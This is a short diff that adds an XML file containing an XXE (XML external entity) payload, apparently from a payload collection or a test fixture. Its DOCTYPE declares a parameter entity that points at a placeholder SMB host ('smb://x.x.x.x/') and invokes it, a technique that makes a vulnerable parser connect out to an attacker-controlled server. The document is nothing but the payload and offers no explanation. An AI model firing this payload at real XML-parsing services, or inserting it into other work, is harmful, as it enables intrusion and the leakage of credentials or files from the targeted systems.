@@ -1,0 +1,8 @@
+<?xml version="1.0" ?>
+<!DOCTYPE xxeElement [
+<!ELEMENT xxeElement ANY >
+<!ENTITY % xxeEntity SYSTEM "smb://x.x.x.x/">
+%xxeEntity;
+%content;
+]>
+<xxeElement>&xxeEntity;</xxeElement>
